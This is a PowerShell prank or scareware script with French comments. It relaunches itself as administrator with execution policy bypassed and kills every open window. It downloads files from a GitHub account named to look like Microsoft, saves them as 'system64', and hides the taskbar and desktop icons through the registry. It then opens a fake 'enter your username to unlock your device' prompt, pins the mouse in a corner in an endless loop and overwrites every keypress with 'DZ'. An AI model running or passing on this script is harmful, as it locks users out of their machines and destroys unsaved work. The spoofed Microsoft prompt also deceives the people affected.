if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }

# ----------------------------------DEFINITIONS (fonctions, etc.)

# VARIABLES
# -----------------------------
# Importer fonction pour poller le clavier (dernier while)
$APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
$API = Add-Type -MemberDefinition $APIsignatures -Name 'maneme' -Namespace API -PassThru

# chéplu mais y en a besoin
Add-Type -AssemblyName System.Windows.Forms

$sound = 0

$notepad_width = 680
$notepad_height = 330
$notepad_posx = (1920/2)-($notepad_width/2)
$notepad_posy = (1080/2)-($notepad_height/2)


# FONCITONS
# -----------------------------
# ----- Changer le fond d'ecran
  # exemple : Set-WallPaper -Image "C:\system64.jpg"
Function Set-WallPaper($Image) {
  New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value "10"  -Force 
  Add-Type -TypeDefinition @"
    using System; 
    using System.Runtime.InteropServices;
    public class Params 
    { 
      [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
      public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam,String lpvParam,Int32 fuWinIni); 
    }
"@ 

  $SPI_SETDESKWALLPAPER = 0x0014
  $UpdateIniFile = 0x01
  $SendChangeEvent = 0x02
  $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}
  
# ----- Changer le volume a une valeur entre 0 et 100
  # exemple : Set-SoundVolume 50
Function Set-SoundVolume 
{
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int]
        $volume
    )

    # Calculate number of key presses. 
    $keyPresses = [Math]::Ceiling( $volume / 2 )
    
    # Create the Windows Shell object. 
    $obj = New-Object -ComObject WScript.Shell
    
    # Set volume to zero. 
    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
    
    # Set volume to specified level. 
    for( $i = 0; $i -lt $keyPresses; $i++ )
    {
        $obj.SendKeys( [char] 175 )
    }
}

# ----- Modifier taille et position d'une fenetre (avec un pipe de get process)
  # exemple : Get-Process powershell | Set-Window -X 1 -Y 1 -Width 100 -Height 70 -Passthru -Verbose
Function Set-Window {
[cmdletbinding(DefaultParameterSetName='Name')]
Param (
    [parameter(Mandatory=$False,
        ValueFromPipelineByPropertyName=$True, ParameterSetName='Name')]
    [string]$ProcessName='*',
    [parameter(Mandatory=$True,
        ValueFromPipeline=$False,              ParameterSetName='Id')]
    [int]$Id,
    [int]$X,
    [int]$Y,
    [int]$Width,
    [int]$Height,
    [switch]$Passthru
)
  Begin {
      Try { 
          [void][Window]
      } Catch {
      Add-Type @"
          using System;
          using System.Runtime.InteropServices;
          public class Window {
          [DllImport("user32.dll")]
          [return: MarshalAs(UnmanagedType.Bool)]
          public static extern bool GetWindowRect(
              IntPtr hWnd, out RECT lpRect);

          [DllImport("user32.dll")]
          [return: MarshalAs(UnmanagedType.Bool)]
          public extern static bool MoveWindow( 
              IntPtr handle, int x, int y, int width, int height, bool redraw);

          [DllImport("user32.dll")] 
          [return: MarshalAs(UnmanagedType.Bool)]
          public static extern bool ShowWindow(
              IntPtr handle, int state);
          }
          public struct RECT
          {
          public int Left;        // x position of upper-left corner
          public int Top;         // y position of upper-left corner
          public int Right;       // x position of lower-right corner
          public int Bottom;      // y position of lower-right corner
          }
"@
      }
  }
  Process {
      $Rectangle = New-Object RECT
      If ( $PSBoundParameters.ContainsKey('Id') ) {
          $Processes = Get-Process -Id $Id -ErrorAction SilentlyContinue
      } else {
          $Processes = Get-Process -Name "$ProcessName" -ErrorAction SilentlyContinue
      }
      if ( $null -eq $Processes ) {
          If ( $PSBoundParameters['Passthru'] ) {
              Write-Warning 'No process match criteria specified'
          }
      } else {
          $Processes | ForEach-Object {
              $Handle = $_.MainWindowHandle
              Write-Verbose "$($_.ProcessName) `(Id=$($_.Id), Handle=$Handle`)"
              if ( $Handle -eq [System.IntPtr]::Zero ) { return }
              $Return = [Window]::GetWindowRect($Handle,[ref]$Rectangle)
              If (-NOT $PSBoundParameters.ContainsKey('X')) {
                  $X = $Rectangle.Left            
              }
              If (-NOT $PSBoundParameters.ContainsKey('Y')) {
                  $Y = $Rectangle.Top
              }
              If (-NOT $PSBoundParameters.ContainsKey('Width')) {
                  $Width = $Rectangle.Right - $Rectangle.Left
              }
              If (-NOT $PSBoundParameters.ContainsKey('Height')) {
                  $Height = $Rectangle.Bottom - $Rectangle.Top
              }
              If ( $Return ) {
                  $Return = [Window]::MoveWindow($Handle, $x, $y, $Width, $Height,$True)
              }
              If ( $PSBoundParameters['Passthru'] ) {
                  $Rectangle = New-Object RECT
                  $Return = [Window]::GetWindowRect($Handle,[ref]$Rectangle)
                  If ( $Return ) {
                      $Height      = $Rectangle.Bottom - $Rectangle.Top
                      $Width       = $Rectangle.Right  - $Rectangle.Left
                      $Size        = New-Object System.Management.Automation.Host.Size        -ArgumentList $Width, $Height
                      $TopLeft     = New-Object System.Management.Automation.Host.Coordinates -ArgumentList $Rectangle.Left , $Rectangle.Top
                      $BottomRight = New-Object System.Management.Automation.Host.Coordinates -ArgumentList $Rectangle.Right, $Rectangle.Bottom
                      If ($Rectangle.Top    -lt 0 -AND 
                          $Rectangle.Bottom -lt 0 -AND
                          $Rectangle.Left   -lt 0 -AND
                          $Rectangle.Right  -lt 0) {
                          Write-Warning "$($_.ProcessName) `($($_.Id)`) is minimized! Coordinates will not be accurate."
                      }
                      $Object = [PSCustomObject]@{
                          Id          = $_.Id
                          ProcessName = $_.ProcessName
                          Size        = $Size
                          TopLeft     = $TopLeft
                          BottomRight = $BottomRight
                      }
                      $Object
                  }
              }
          }
      }
  }
}



# ---------------------------------- ACTIONS

# Fermer fenetres ouvertes sauf PS (pour continuer a executer)
Get-Process | Where-Object {$_.MainWindowTitle -ne "" -and $_.processname -ne "powershell"} | stop-process

# Redimensionner PS
Get-Process powershell | Set-Window -X 1 -Y 1 -Width 100 -Height 70 -Passthru

# ----- ADMIN RIGHTS REQUIRED -----------
# Telecharger des trucs
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/MilkrosoftWindows/le_programme_des_aides/raw/main/dz_1900_600.jpg", "C:\system64.jpg")
$WebClient.DownloadFile("https://github.com/MilkrosoftWindows/le_programme_des_aides/raw/main/son.mp3", "C:\system64.mp3")

# Cacher la barre des taches
$p="HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3";
$v=(Get-ItemProperty -Path $p).Settings;
$v[8]=3;
&Set-ItemProperty -Path $p -Name Settings -Value $v;

# Cacher icones desktop
$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 #cache icones
Get-Process "explorer" | Stop-Process # reboot explorer

# Changer fond d'ecran vers image
Set-WallPaper -Image "C:\system64.jpg"

# Fonction set volume
Set-SoundVolume $sound

# Jouer Musique
Add-Type -AssemblyName presentationCore
$mediaPlayer = New-Object system.windows.media.mediaplayer
$mediaPlayer.open('C:\system64.mp3')
$mediaPlayer.Play()

# Ouvrir notepad
Start-Process 'C:\windows\system32\notepad.exe'

# Redimensionner notepad
Get-Process notepad | Set-Window -X $notepad_posx -Y $notepad_posy -Width $notepad_width -Height $notepad_height -Passthru

Start-Sleep 1

# Mettre la souris au coin une premiere fois pour Confusion
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(5000, 0) # set pos souris (5000,0)

# Remplir le notepad
[System.Windows.Forms.SendKeys]::SendWait("VOUVOU(zéla) ZETTE FÉ A QUAI")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

# Mettre la souris au coin une deuxieme fois pour Confusion++ (sinon le temps que ca tape le texte il peut bouger)
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(5000, 0) # set pos souris (5000,0)

[System.Windows.Forms.SendKeys]::SendWait("Entrez votre nom ")

# Mettre la souris au coin une deuxieme fois pour Confusion+++ (sinon le temps que ca tape le texte il peut bouger)
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(5000, 0) # set pos souris (5000,0)

[System.Windows.Forms.SendKeys]::SendWait("d'utilisateur pour ")

# Mettre la souris au coin une deuxieme fois pour Confusion++++ (sinon le temps que ca tape le texte il peut bouger)
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(5000, 0) # set pos souris (5000,0)

[System.Windows.Forms.SendKeys]::SendWait("débloquer votre appareil :")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

while ($true)
{
  # Bloquer le curseur au coin
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(5000, 0) # set pos souris (5000,0)

  # Scanner clavier -> DZ
    # scan some ASCII codes (http://claude.segeral.pagesperso-orange.fr/qwerazer/)
    # 65 to 127 add some special chars + uppercase but slow
    # 97 to 122 lower case a to z
    # en fait c'est d'autres codes
    for ($ascii = 65; $ascii -le 97; $ascii++) {
        if($API::GetAsyncKeyState($ascii) -eq -32767) {
            [System.Windows.Forms.SendKeys]::SendWait("{BACKSPACE}")
            [System.Windows.Forms.SendKeys]::SendWait("DZ")
        }
    }
}